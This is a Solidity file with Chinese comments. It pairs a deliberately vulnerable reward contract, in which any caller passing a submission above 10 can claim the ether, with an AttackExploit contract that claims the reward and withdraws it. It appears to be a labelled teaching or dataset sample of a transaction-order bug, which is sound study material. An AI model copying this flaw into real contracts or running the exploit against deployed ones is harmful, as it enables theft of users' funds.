pragma solidity >=0.8.0;

// SPDX-License-Identifier: UNLICENSED

// 漏洞合約: Incorrect Function Call Order (呼叫順序錯誤漏洞)
// 此合約預期某些函式必須依照特定順序被呼叫，但實際上並未嚴格限制，導致攻擊者可利用呼叫順序錯誤竊取 reward Ether。

contract EthTxOrderDependenceMinimal {
    address public owner;      // 漏洞重點：owner 設定與權限控管
    bool public claimed;       // 漏洞重點：尚未宣布 reward 是否已經被領取
    uint public reward;        // 漏洞重點：reward 的設定與更新順序不正確

    constructor() {
        owner = msg.sender;
    }

    // 預期由 owner 呼叫，設定 reward 並返還上一次 reward (如果有的話)，但順序有誤
    function setReward() public payable {
        require(!claimed, "Reward already claimed");
        require(msg.sender == owner, "Only owner can call setReward");
        // 漏洞：在更新 reward 前就先轉移 reward 金額
        payable(owner).transfer(reward);
        reward = msg.value;
    }

    // 公開函式，任何人只要參數 submission 大於 10 就可以呼叫
    // 漏洞：未檢查呼叫者身份，可能被惡意攻擊者利用不正確的呼叫順序取得 reward
    function claimReward(uint256 submission) public {
        require(!claimed, "Reward already claimed");
        require(submission > 10, "Submission must be > 10");
        // 將 reward 轉給呼叫者，而非限定為應得者
        payable(msg.sender).transfer(reward);
        claimed = true;
    }

    // receive function 用以接收 Ether
    receive() external payable {}
}

// 攻擊合約: AttackExploit
// 攻擊流程說明：
// 1. 攻擊者部署 AttackExploit 並傳入漏洞合約的地址。
// 2. 當 owner 呼叫 setReward 並存入一定 ether 後，reward 被設定，但攻擊者可呼叫 claimReward
//    並藉由 submission 參數滿足條件（如傳入 11），因此獲得 reward 金額。

contract AttackExploit {
    // 注意：由於合約 EthTxOrderDependenceMinimal 有 payable fallback，
    // 因此在將地址轉型為合約類型時，需先將 address 轉為 payable
    EthTxOrderDependenceMinimal public vulnerableContract;

    // 參數改為 address，並在轉換時加上 payable
    constructor(address _vulnerableContract) {
        vulnerableContract = EthTxOrderDependenceMinimal(payable(_vulnerableContract));
    }

    // 攻擊流程：直接呼叫 claimReward 竊取 reward
    function attack(uint256 submission) public {
        // 攻擊者不需要依照原預期的呼叫順序，即可嘗試呼叫 claimReward
        vulnerableContract.claimReward(submission);
    }

    // 提款函式：提取攻擊合約內累積的 Ether
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // receive 用以接收 Ether
    receive() external payable {}
}
